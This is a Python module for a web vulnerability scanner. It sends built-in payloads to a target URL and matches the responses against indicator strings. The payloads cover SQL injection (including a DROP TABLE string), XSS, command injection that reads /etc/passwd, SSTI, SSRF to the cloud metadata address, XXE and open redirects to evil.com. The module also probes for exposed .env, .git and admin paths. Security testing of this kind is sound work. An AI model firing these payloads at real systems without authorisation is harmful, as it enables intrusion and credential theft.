"""Web vulnerability scanner."""

from __future__ import annotations

import asyncio
from urllib.parse import quote, urljoin

from ..core.config import ScanConfig
from ..core.models import Severity, Vulnerability

VULN_CHECKS = [
    {
        "name": "SQL Injection",
        "method": "GET",
        "path": "?id={payload}",
        "payloads": ["'", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1--", "1; DROP TABLE users"],
        "indicators": ["SQL syntax", "mysql_fetch", "syntax error", "ORA-", "PostgreSQL", "sqlite3.OperationalError", "Unclosed quotation mark"],
        "severity": Severity.CRITICAL,
        "cwe": "CWE-89",
    },
    {
        "name": "Reflected XSS",
        "method": "GET",
        "path": "?search={payload}&q={payload}&s={payload}",
        "payloads": ["<script>alert('XSS')</script>", "\"><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg onload=alert(1)>"],
        "indicators": ["<script>alert('XSS')</script>", "onerror=alert(1)", "javascript:alert(1)", "onload=alert(1)"],
        "severity": Severity.HIGH,
        "cwe": "CWE-79",
    },
    {
        "name": "Directory Traversal",
        "method": "GET",
        "path": "?file={payload}&path={payload}&page={payload}",
        "payloads": ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "..\\..\\..\\windows\\win.ini"],
        "indicators": ["root:", "daemon:", "[extensions]", "for 16-bit app support"],
        "severity": Severity.HIGH,
        "cwe": "CWE-22",
    },
    {
        "name": "Command Injection",
        "method": "GET",
        "path": "?cmd={payload}&exec={payload}&ping={payload}",
        "payloads": [";id", "|id", "`id`", "$(id)", "; cat /etc/passwd"],
        "indicators": ["uid=", "gid=", "groups=", "root:"],
        "severity": Severity.CRITICAL,
        "cwe": "CWE-78",
    },
    {
        "name": "Server-Side Template Injection",
        "method": "GET",
        "path": "?name={payload}&template={payload}",
        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}", "{{self.__class__.__mro__}}"],
        "indicators": ["49", "SECRET_KEY", "__class__", "Config"],
        "severity": Severity.CRITICAL,
        "cwe": "CWE-1336",
    },
    {
        "name": "SSRF",
        "method": "GET",
        "path": "?url={payload}&fetch={payload}&proxy={payload}",
        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80", "file:///etc/passwd", "http://[::1]/"],
        "indicators": ["ami-id", "instance-id", "root:", "EC2"],
        "severity": Severity.CRITICAL,
        "cwe": "CWE-918",
    },
    {
        "name": "Open Redirect",
        "method": "GET",
        "path": "?redirect={payload}&url={payload}&next={payload}&return={payload}",
        "payloads": ["https://evil.com", "//evil.com", "/\\evil.com", "https://evil.com%2F.."],
        "indicators": ["evil.com"],
        "severity": Severity.MEDIUM,
        "cwe": "CWE-601",
        "check_redirect": True,
    },
    {
        "name": "XXE Injection",
        "method": "POST",
        "path": "",
        "payloads": ['<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'],
        "indicators": ["root:", "daemon:"],
        "severity": Severity.CRITICAL,
        "cwe": "CWE-611",
        "content_type": "application/xml",
    },
]

SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/.htaccess", "/.htpasswd",
    "/config.php", "/wp-config.php.bak", "/web.config", "/phpinfo.php",
    "/server-status", "/server-info", "/.well-known/security.txt",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/elmah.axd",
    "/.DS_Store", "/Thumbs.db", "/.svn/entries", "/.hg",
    "/composer.json", "/package.json", "/Gemfile", "/requirements.txt",
    "/Dockerfile", "/docker-compose.yml", "/.dockerignore",
    "/.travis.yml", "/.github/workflows/", "/wp-json/wp/v2/users",
    "/graphql", "/api/swagger.json", "/swagger-ui.html",
    "/debug", "/trace", "/console", "/actuator", "/actuator/env",
    "/actuator/health", "/metrics", "/api/v1/pods",
]

ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/administrator/",
    "/wp-admin", "/wp-login.php", "/login", "/signin",
    "/cpanel", "/manager", "/manager/html", "/admin.php",
    "/backend", "/controlpanel", "/dashboard", "/panel",
    "/admincp", "/adm", "/sysadmin", "/moderator",
    "/user/login", "/account/login", "/auth/login",
]

BACKUP_EXTENSIONS = [".bak", ".backup", ".old", ".orig", ".swp", ".save", ".tmp", ".copy", ".1"]


class VulnerabilityScanner:
    """Scan for web vulnerabilities."""

    def __init__(self, config: ScanConfig) -> None:
        self.config = config

    async def scan(self, url: str, session) -> list[Vulnerability]:
        vulns: list[Vulnerability] = []
        sem = asyncio.Semaphore(self.config.concurrency)

        # Run all check types concurrently
        await asyncio.gather(
            self._check_vulns(url, session, sem, vulns),
            self._check_sensitive(url, session, sem, vulns),
            self._check_admin(url, session, sem, vulns),
            self._check_backups(url, session, sem, vulns),
        )

        return vulns

    async def _check_vulns(self, url: str, session: object, sem: asyncio.Semaphore, vulns: list[Vulnerability]) -> None:
        tasks = []
        for check in VULN_CHECKS:
            for payload in check["payloads"]:
                tasks.append(self._test_payload(url, session, sem, check, payload, vulns))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_payload(self, url: str, session: object, sem: asyncio.Semaphore, check: dict[str, object], payload: str, vulns: list[Vulnerability]) -> None:
        async with sem:
            full_path = check["path"].format(payload=quote(payload, safe=""))
            target = urljoin(url, full_path)
            headers = {}
            data = None

            if check.get("content_type"):
                headers["Content-Type"] = check["content_type"]
                data = payload

            resp, content = await session.request(
                check["method"], target, headers=headers, data=data,
                allow_redirects=not check.get("check_redirect", False),
            )

            if not resp:
                return

            # Check for vulnerability indicators
            for indicator in check["indicators"]:
                if indicator.lower() in content.lower():
                    vulns.append(Vulnerability(
                        name=check["name"],
                        severity=check["severity"],
                        url=target,
                        description=f"Possible {check['name']} detected with indicator: {indicator}",
                        payload=payload,
                        recommendation=f"Sanitize and validate all user input to prevent {check['name']}",
                        cwe=check.get("cwe"),
                    ))
                    return  # One finding per check type is enough

            # Open redirect: check for redirect response
            if check.get("check_redirect") and resp.status in (301, 302, 303, 307, 308):
                location = resp.headers.get("Location", "")
                if "evil.com" in location:
                    vulns.append(Vulnerability(
                        name=check["name"],
                        severity=check["severity"],
                        url=target,
                        description=f"Redirects to attacker-controlled URL: {location}",
                        payload=payload,
                        recommendation="Validate redirect URLs against an allowlist",
                        cwe=check.get("cwe"),
                    ))

    async def _check_sensitive(self, url: str, session: object, sem: asyncio.Semaphore, vulns: list[Vulnerability]) -> None:
        async def check_path(path: str) -> None:
            async with sem:
                target = urljoin(url, path)
                resp, content = await session.get(target)
                if not resp or resp.status != 200:
                    return

                # Validate it's actually accessible (not a custom 404)
                if len(content) < 10:
                    return

                sev = Severity.LOW
                desc = f"Sensitive file accessible: {path}"

                if path == "/.env" and any(k in content for k in ["DB_PASSWORD", "SECRET", "API_KEY"]):
                    sev = Severity.CRITICAL
                    desc = "Environment file with credentials exposed"
                elif path in ("/.git/config", "/.git/HEAD"):
                    sev = Severity.HIGH
                    desc = "Git repository exposed — source code may be downloadable"
                elif path == "/phpinfo.php":
                    sev = Severity.MEDIUM
                    desc = "phpinfo() page exposes server configuration"
                elif "actuator" in path:
                    sev = Severity.HIGH
                    desc = "Spring Boot Actuator exposed — may leak environment variables"
                elif path in ("/wp-json/wp/v2/users", "/graphql", "/swagger-ui.html"):
                    sev = Severity.LOW
                    desc = f"API endpoint exposed: {path}"

                vulns.append(Vulnerability(
                    name="Sensitive File Exposure",
                    severity=sev,
                    url=target,
                    description=desc,
                    recommendation="Restrict access to sensitive files via web server config",
                    cwe="CWE-538",
                ))

        tasks = [check_path(p) for p in SENSITIVE_PATHS]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _check_admin(self, url: str, session: object, sem: asyncio.Semaphore, vulns: list[Vulnerability]) -> None:
        async def check_admin(path: str) -> None:
            async with sem:
                target = urljoin(url, path)
                resp, content = await session.get(target)
                if not resp or resp.status != 200:
                    return

                content_lower = content.lower()
                indicators = ["login", "password", "username", "sign in", "admin", "dashboard", "authenticate"]
                if any(i in content_lower for i in indicators):
                    vulns.append(Vulnerability(
                        name="Exposed Admin Panel",
                        severity=Severity.MEDIUM,
                        url=target,
                        description=f"Admin panel found at {path}",
                        recommendation="Restrict admin access by IP, add MFA, use non-standard paths",
                        cwe="CWE-200",
                    ))

        tasks = [check_admin(p) for p in ADMIN_PATHS]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _check_backups(self, url: str, session: object, sem: asyncio.Semaphore, vulns: list[Vulnerability]) -> None:
        targets = ["/config", "/database", "/db", "/backup", "/dump", "/www", "/site", "/app"]
        tasks = []

        async def check_backup(base: str, ext: str) -> None:
            async with sem:
                target = urljoin(url, base + ext)
                resp, content = await session.get(target)
                if resp and resp.status == 200 and len(content) > 100:
                    vulns.append(Vulnerability(
                        name="Backup File Exposure",
                        severity=Severity.MEDIUM,
                        url=target,
                        description=f"Backup file found: {base}{ext}",
                        recommendation="Remove backup files from web root, use .gitignore",
                        cwe="CWE-530",
                    ))

        for base in targets:
            for ext in BACKUP_EXTENSIONS:
                tasks.append(check_backup(base, ext))
        await asyncio.gather(*tasks, return_exceptions=True)
